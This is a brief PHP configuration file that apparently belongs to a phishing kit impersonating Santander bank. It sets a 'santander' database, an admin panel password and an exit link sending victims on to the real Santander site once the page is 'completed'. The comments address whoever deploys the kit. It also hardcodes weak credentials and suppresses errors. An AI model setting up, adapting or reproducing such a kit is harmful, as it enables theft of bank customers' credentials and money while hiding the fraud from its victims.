<?php
error_reporting(0);
$servername = "localhost";
$database = "santander";
$username = "root";
$password = "mysql";

// admin panel password
$admin_panel_password = "adam"; // make sure to change this one

// exit link when errors or when page completed [i made it redirect to the login page again u can change that anytime obviously]
$exit_link = "https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwi58dSItN3sAhUKHxoKHXV2B78QFjAAegQIARAD&url=https%3A%2F%2Fwww.santander.co.uk%2F&usg=AOvVaw2bqlfnkQ5F_SpW4cyWBXcA";


?>